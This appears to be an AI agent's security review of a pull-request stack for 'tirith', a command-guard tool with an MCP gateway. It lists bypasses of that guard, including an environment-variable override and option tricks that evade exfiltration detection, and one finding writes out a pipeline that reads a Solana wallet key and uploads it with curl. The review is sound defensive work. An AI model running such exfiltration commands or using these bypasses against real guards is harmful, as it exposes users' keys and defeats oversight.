No-go. I manually reviewed all four PR layers and the cumulative stack without the Codex Security plugin. I confirmed 26 code/review findings: 1 Critical, 14 High/P1, 9 Medium/P2, and 2 Low.

## Immediate stack blockers

- The stack base is 122 commits behind current `main` (`3e7c62d`). Merging final head `e9cf7c6` into `main` produces 131 conflicts across engine, policy, workflows, artifacts, tests, and documentation.
- All PRs are open and `unstable`:

| PR | Head | Failing checks |
|---|---|---|
| [[#197](https://github.com/sheeki03/tirith/pull/197)](https://github.com/sheeki03/tirith/pull/197) | `e3d030c` | Windows |
| [[#198](https://github.com/sheeki03/tirith/pull/198)](https://github.com/sheeki03/tirith/pull/198) | `1f9e2d2` | Windows, macOS |
| [[#201](https://github.com/sheeki03/tirith/pull/201)](https://github.com/sheeki03/tirith/pull/201) | `38e21ff` | Linux, macOS, Windows, MSRV |
| [[#199](https://github.com/sheeki03/tirith/pull/199)](https://github.com/sheeki03/tirith/pull/199) | `e9cf7c6` | Linux, macOS, Windows, MSRV |

- Benchmark alerts show regressions up to 27% in #197, 35% in #198, and 49% in #199. They remain green because relative alerts are non-blocking and absolute budgets are deliberately generous.
- No human approval exists. CodeRabbit skipped all four; Greptile skipped #198/#199 and left an unresolved P1 on #201.
- The branch’s own [[release evidence](https://github.com/sheeki03/tirith/blob/e9cf7c602b664da195700d8cca0ca5565e4dec4d/docs/release-evidence-web3-task-boundary.md#L90-L103)](https://github.com/sheeki03/tirith/blob/e9cf7c602b664da195700d8cca0ca5565e4dec4d/docs/release-evidence-web3-task-boundary.md#L90-L103) explicitly leaves retargeting and the full CI matrix open.

## Critical and inherited blockers

These predate parts of the stack but directly undermine PR #198’s new boundary guarantees:

1. **Critical — MCP clients can bypass enforcement with `TIRITH=0`.** Gateway requests are incorrectly marked interactive and use the bypass-aware analyzer. The new task gate runs afterward and defaults off. See [[gateway.rs](https://github.com/sheeki03/tirith/blob/e9cf7c602b664da195700d8cca0ca5565e4dec4d/crates/tirith/src/cli/gateway.rs#L3153-L3211)](https://github.com/sheeki03/tirith/blob/e9cf7c602b664da195700d8cca0ca5565e4dec4d/crates/tirith/src/cli/gateway.rs#L3153-L3211). Make gateway analysis noninteractive and bypass-free.

2. **High — one command field is inspected while the entire request is forwarded.** With multiple configured command paths, Tirith authorizes the first nonempty field while an upstream tool can execute another. See [[gateway.rs](https://github.com/sheeki03/tirith/blob/e9cf7c602b664da195700d8cca0ca5565e4dec4d/crates/tirith/src/cli/gateway.rs#L3698-L3724)](https://github.com/sheeki03/tirith/blob/e9cf7c602b664da195700d8cca0ca5565e4dec4d/crates/tirith/src/cli/gateway.rs#L3698-L3724). Reject multiple populated command fields or canonicalize and bind the inspected request.

## PR #197 — C00–C03

3. **High — PDF+ZIP polyglot bypass.** A valid trailing ZIP followed by one junk byte is treated as an exclusive PDF, although the locked ZIP reader accepts it. Hidden ZIP members are not scanned. See [[content_kind.rs](https://github.com/sheeki03/tirith/blob/e9cf7c602b664da195700d8cca0ca5565e4dec4d/crates/tirith-core/src/content_kind.rs#L569-L597)](https://github.com/sheeki03/tirith/blob/e9cf7c602b664da195700d8cca0ca5565e4dec4d/crates/tirith-core/src/content_kind.rs#L569-L597).

4. **Medium — failed PDF analysis reports complete coverage.** Four early failure paths emit `AnalysisIncomplete` but return default, empty coverage metadata. See [[rendered.rs](https://github.com/sheeki03/tirith/blob/e9cf7c602b664da195700d8cca0ca5565e4dec4d/crates/tirith-core/src/rules/rendered.rs#L6332-L6387)](https://github.com/sheeki03/tirith/blob/e9cf7c602b664da195700d8cca0ca5565e4dec4d/crates/tirith-core/src/rules/rendered.rs#L6332-L6387).

5. **Medium — CLI/MCP completeness contradicts findings.** Aggregate output can contain a High `AnalysisIncomplete` finding while reporting `analysis_incomplete:false` and MCP `is_error:false`. See [[scan.rs](https://github.com/sheeki03/tirith/blob/e9cf7c602b664da195700d8cca0ca5565e4dec4d/crates/tirith/src/cli/scan.rs#L451-L462)](https://github.com/sheeki03/tirith/blob/e9cf7c602b664da195700d8cca0ca5565e4dec4d/crates/tirith/src/cli/scan.rs#L451-L462) and [[resources.rs](https://github.com/sheeki03/tirith/blob/e9cf7c602b664da195700d8cca0ca5565e4dec4d/crates/tirith-core/src/mcp/resources.rs#L10-L31)](https://github.com/sheeki03/tirith/blob/e9cf7c602b664da195700d8cca0ca5565e4dec4d/crates/tirith-core/src/mcp/resources.rs#L10-L31).

## PR #198 — C04–C12

6. **High — most `web3_guard` controls are configuration-only.** `selector_aliases`, required command cards/key IDs, denied destinations, incomplete-analysis action, and ambiguous-Hardhat action are parsed but never enforced. `RequireApproval` also collapses into an ordinary warning. See [[web3_policy.rs](https://github.com/sheeki03/tirith/blob/e9cf7c602b664da195700d8cca0ca5565e4dec4d/crates/tirith-core/src/web3_policy.rs#L195-L233)](https://github.com/sheeki03/tirith/blob/e9cf7c602b664da195700d8cca0ca5565e4dec4d/crates/tirith-core/src/web3_policy.rs#L195-L233) and [[web3_gate.rs](https://github.com/sheeki03/tirith/blob/e9cf7c602b664da195700d8cca0ca5565e4dec4d/crates/tirith-core/src/rules/web3_gate.rs#L36-L43)](https://github.com/sheeki03/tirith/blob/e9cf7c602b664da195700d8cca0ca5565e4dec4d/crates/tirith-core/src/rules/web3_gate.rs#L36-L43).

7. **High — signer allowlists are bypassable.** Signer checks are skipped when no explicit RPC host exists; AWS KMS, stdin, prompt, and unknown signers map to no policy kind. See [[web3_gate.rs](https://github.com/sheeki03/tirith/blob/e9cf7c602b664da195700d8cca0ca5565e4dec4d/crates/tirith-core/src/rules/web3_gate.rs#L287-L401)](https://github.com/sheeki03/tirith/blob/e9cf7c602b664da195700d8cca0ca5565e4dec4d/crates/tirith-core/src/rules/web3_gate.rs#L287-L401).

8. **High — RPC path denials never match.** Matchers support `path_prefix`, but enforcement always supplies `None`, and the engine explicitly disables trusted path-prefix matching. See [[engine.rs](https://github.com/sheeki03/tirith/blob/e9cf7c602b664da195700d8cca0ca5565e4dec4d/crates/tirith-core/src/engine.rs#L3056-L3072)](https://github.com/sheeki03/tirith/blob/e9cf7c602b664da195700d8cca0ca5565e4dec4d/crates/tirith-core/src/engine.rs#L3056-L3072).

9. **High — Web3 fact counts can launder an unmodeled shell segment.** Multiple nested Web3 facts can satisfy the count for unrelated top-level segments, incorrectly making analysis complete. See [[task.rs](https://github.com/sheeki03/tirith/blob/e9cf7c602b664da195700d8cca0ca5565e4dec4d/crates/tirith-core/src/task.rs#L626-L636)](https://github.com/sheeki03/tirith/blob/e9cf7c602b664da195700d8cca0ca5565e4dec4d/crates/tirith-core/src/task.rs#L626-L636). Coverage must be tracked by segment identity.

10. **High — nested-shell wallet reads do not propagate into outer upload pipelines.**  
   `bash -c "cat ~/.config/solana/id.json" | curl --data-binary @- …` splits the source and sink across independent analyses. See [[command.rs](https://github.com/sheeki03/tirith/blob/e9cf7c602b664da195700d8cca0ca5565e4dec4d/crates/tirith-core/src/rules/command.rs#L932-L1031)](https://github.com/sheeki03/tirith/blob/e9cf7c602b664da195700d8cca0ca5565e4dec4d/crates/tirith-core/src/rules/command.rs#L932-L1031).

11. **Medium — provenance receipts are not verified against their signed task context.** Task ID/source/acquisition path are signed but not compared; omitted policy identity bypasses an expected identity; `issued_at` is ignored. See [[task.rs](https://github.com/sheeki03/tirith/blob/e9cf7c602b664da195700d8cca0ca5565e4dec4d/crates/tirith-core/src/task.rs#L262-L392)](https://github.com/sheeki03/tirith/blob/e9cf7c602b664da195700d8cca0ca5565e4dec4d/crates/tirith-core/src/task.rs#L262-L392).

## PR #201 — C13–C18

12. **P1 — build receipts do not represent a coherent tree.** Directories/root membership and identity are never revalidated. Concurrent additions are omitted; replacing a queued directory with a symlink can hash files outside the declared tree. See [[build_receipt.rs](https://github.com/sheeki03/tirith/blob/e9cf7c602b664da195700d8cca0ca5565e4dec4d/crates/tirith-core/src/build_receipt.rs#L455-L688)](https://github.com/sheeki03/tirith/blob/e9cf7c602b664da195700d8cca0ca5565e4dec4d/crates/tirith-core/src/build_receipt.rs#L455-L688). Greptile’s P1 is valid.

13. **P1 — capsule copying removes execute permissions.** Every file becomes `0600`, so the documented `./scripts/build.sh` invocation fails with `EACCES`. See [[capsule_project.rs](https://github.com/sheeki03/tirith/blob/e9cf7c602b664da195700d8cca0ca5565e4dec4d/crates/tirith-core/src/capsule_project.rs#L820-L840)](https://github.com/sheeki03/tirith/blob/e9cf7c602b664da195700d8cca0ca5565e4dec4d/crates/tirith-core/src/capsule_project.rs#L820-L840).

14. **P1 — unresolved workflow producers can trigger a risk downgrade.** Composite/local/reusable upload actions are filtered out before unresolved state is propagated, allowing a real fork-to-privileged artifact chain to drop from High to Medium.

15. **P1 — `find -exec` is considered inert after artifact download.** Downloaded attacker-controlled executables can run without a sink or unmodeled marker. See [[workflow_artifacts.rs](https://github.com/sheeki03/tirith/blob/e9cf7c602b664da195700d8cca0ca5565e4dec4d/crates/tirith-core/src/workflow_artifacts.rs#L1188-L1254)](https://github.com/sheeki03/tirith/blob/e9cf7c602b664da195700d8cca0ca5565e4dec4d/crates/tirith-core/src/workflow_artifacts.rs#L1188-L1254).

16. **P1 — npm subtraction can claim Clean without npm auditing the package.** User/global npm configuration is inherited, while omitted packages are inferred as signature-verified based only on lockfile registry host. Hermetic npm configuration and explicit audit membership are required.

17. **P1 — new `find`/GNU Parallel exfil detection is trivially evaded by options.** `find -L …` loses the sensitive root; `parallel --jobs 4 cat ::: …` treats `4` as the utility. See [[command.rs](https://github.com/sheeki03/tirith/blob/e9cf7c602b664da195700d8cca0ca5565e4dec4d/crates/tirith-core/src/rules/command.rs#L5802-L5871)](https://github.com/sheeki03/tirith/blob/e9cf7c602b664da195700d8cca0ca5565e4dec4d/crates/tirith-core/src/rules/command.rs#L5802-L5871).

18. **P1 — browser digests can omit concurrent extension changes while remaining Complete.** Directory membership is captured once and never rechecked.

19. **P2 — Linux Chrome beta is skipped whenever stable Chrome exists.** Discovery uses `find`, auditing only the first existing installation root.

20. **P2 — capsule copy/inventory accepts moving trees.** Concurrent additions can be omitted and same-inode writes can produce mixed content while the receipt remains `Contained`.

## PR #199 — C19–C20

21. **Medium — `PolicyChange` is missed through lexical path aliases.** `.tirith/subdir/../policy.yaml` is treated as an ordinary config write. See [[task.rs](https://github.com/sheeki03/tirith/blob/e9cf7c602b664da195700d8cca0ca5565e4dec4d/crates/tirith-core/src/task.rs#L543-L556)](https://github.com/sheeki03/tirith/blob/e9cf7c602b664da195700d8cca0ca5565e4dec4d/crates/tirith-core/src/task.rs#L543-L556).

22. **Medium — golden tests still race through process-global environment variables.** Different locks protect ThreatDB and policy/Kubernetes/XDG mutations; cleanup is not RAII.

23. **Medium — workflow truncation fuzz assertion is a no-op.** It evaluates `steps_truncated()` and discards the result. See [[workflow_artifact.rs](https://github.com/sheeki03/tirith/blob/e9cf7c602b664da195700d8cca0ca5565e4dec4d/fuzz/fuzz_targets/workflow_artifact.rs#L41-L45)](https://github.com/sheeki03/tirith/blob/e9cf7c602b664da195700d8cca0ca5565e4dec4d/fuzz/fuzz_targets/workflow_artifact.rs#L41-L45).

24. **Medium — Web3 secret-leak fuzzing misses canonical `0x…` values.** The `x` prevents the run from being considered hexadecimal. See [[web3_command.rs](https://github.com/sheeki03/tirith/blob/e9cf7c602b664da195700d8cca0ca5565e4dec4d/fuzz/fuzz_targets/web3_command.rs#L108-L128)](https://github.com/sheeki03/tirith/blob/e9cf7c602b664da195700d8cca0ca5565e4dec4d/fuzz/fuzz_targets/web3_command.rs#L108-L128).

25. **Low — “requesting never grants” fuzz property duplicates the preceding subset assertion.** It never compares requested versus unrequested decisions.

26. **Low — determinism fuzzing compares counts/projections rather than full results.** Package identities, argv, truncation, complete Web3 facts, and other fields can drift undetected.

## Local verification

Final head compiled locally. `cargo test --workspace --locked -q` reached execution but failed with 23/37 `npm_attest_cli` failures because its fake npm lives under `CARGO_TARGET_TMPDIR`; when the target directory is under `/tmp`, Tirith correctly refuses it as an untrusted executable. That is an additional non-hermetic test-harness issue, not proven to be GitHub’s failure cause.

## Cleanup completed

- Removed inactive clean worktrees and audit worktrees.
- Pruned eight stale worktree records.
- Removed canceled/current audit targets and old root/fuzz targets.
- Cleanup tools reported roughly 103 GiB of logical artifacts removed.
- Disk now has about 60 GiB free.
- No old Cargo processes remain.
- Preserved `.codex-c15`, `.codex-candidates`, `.codex-stack`, and the C00–C08 worktree because they contain or back unique uncommitted source/recovery data.

No repository source files were changed.
